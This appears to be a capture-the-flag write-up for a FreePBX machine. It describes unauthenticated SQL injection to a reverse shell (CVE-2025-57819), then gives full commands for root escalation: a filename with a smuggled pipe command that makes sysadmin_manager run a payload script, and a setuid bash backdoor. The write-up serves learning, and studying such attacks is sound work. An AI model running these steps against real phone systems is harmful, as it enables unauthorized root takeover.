02

Initial Access — FreePBX

The web interface is FreePBX 16.0.40.7.

Foothold — Unauthenticated SQLi to RCE (CVE-2025-57819)

FreePBX 16.0.40.7 is vulnerable to an unauthenticated SQL injection in /admin/ajax.php. The database user has EVENT privileges, allowing us to create a scheduled MySQL event that executes a reverse shell.

Exploit:

1. Start a listener:

nc -lvnp 4444

Use the Metasploit module (recommended) or manual SQL injection to insert a cron job / MySQL event that downloads and executes a reverse shell. You will receive a shell as the asterisk user.

User Flag

cat /home/asterisk/user.txt
User Flag
Why this matteredDatabase EVENT privileges are easy to overlook during hardening — they turn a 'read-only' SQL injection into a full command-execution primitive without needing file-write access anywhere on disk.
03

Privilege Escalation — incrond + sysadmin_manager Pipe Injection

Discovery

ps aux | grep incrond
cat /etc/incron.d/sysadmin

The system uses incrond (inotify-based cron) watching /var/spool/asterisk/incron/. Any file modification triggers:

/usr/bin/sysadmin_manager <filename>

This binary runs as root and has a pipe injection vulnerability when handling signed hooks.

Exploitation

Create the root payload:

cat > /var/spool/asterisk/evil << 'EOF'
#!/bin/bash
id > /var/spool/asterisk/rootproof.txt 2>&1
whoami >> /var/spool/asterisk/rootproof.txt 2>&1
cat /root/root.txt > /var/spool/asterisk/rootflag.txt 2>&1
cp /bin/bash /var/spool/asterisk/.rootbash 2>&1
chmod 6777 /var/spool/asterisk/.rootbash 2>&1
EOF
chmod +x /var/spool/asterisk/evil

Trigger the vulnerability with correct filename (CONTENTS mode):

printf '%s' 'x | /var/spool/asterisk/evil' > /var/spool/asterisk/incron/framework.logrotate.CONTENTS
sleep 6

Verify execution:

cat /var/spool/asterisk/rootproof.txt
cat /var/spool/asterisk/rootflag.txt
Root Flag

Interactive root shell:

/var/spool/asterisk/.rootbash -p
Why this matteredWatching for inotify/cron-style automation tied to a privileged binary is a productive Linux privesc habit — the trust boundary between 'a file changed' and 'run this file's contents as root' is often thinner than it looks.
